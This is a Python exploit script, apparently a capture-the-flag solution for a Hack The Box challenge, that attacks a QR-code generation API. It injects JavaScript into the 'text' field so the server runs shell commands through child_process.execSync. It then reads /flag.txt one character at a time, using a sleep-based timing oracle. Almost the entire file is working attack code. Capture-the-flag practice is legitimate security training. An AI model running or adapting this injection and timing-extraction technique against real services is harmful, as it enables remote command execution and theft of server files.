import time
import requests
import json

DELAY = 2
server = "94.237.62.166"
port = 56997

url = f"http://{server}:{port}"
auth_endpoint = f"{url}/api/auth/authenticate"
qr_endpoint = f"{url}/api/service/generate"

def get_token():
    headers = {"Content-Type": "application/json"}
    data = {"email": "test@hackthebox.com"}
    response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
    return response.json()['token']

def oracle(pos, char, token):
    start = time.time()
    payload = {
        "text": f"'}}) + require('child_process').execSync('head -c {pos} /flag.txt | tail -c 1 | {{ read c; if [ \"$c\" = \"{char}\" ]; then sleep {DELAY}; fi; }}')//"
    }
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}"
    }
    response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))
    return time.time() - start > DELAY

def find_chars(token):
    pos = 1
    found_chars = []
    while len(found_chars) < 36:
        char_found = False
        for char_code in range(32, 127):
            if oracle(pos, chr(char_code), token):
                found_chars.append(chr(char_code))
                print(chr(char_code), end='', flush=True)
                char_found = True
                break
        if not char_found:
            print("No new character found. Stopping execution.", flush=True)
            break
        pos += 1
    return found_chars

# Example usage
token = get_token()
print("[*] The flag is: ", end='', flush=True)
found_chars = find_chars(token)
print()
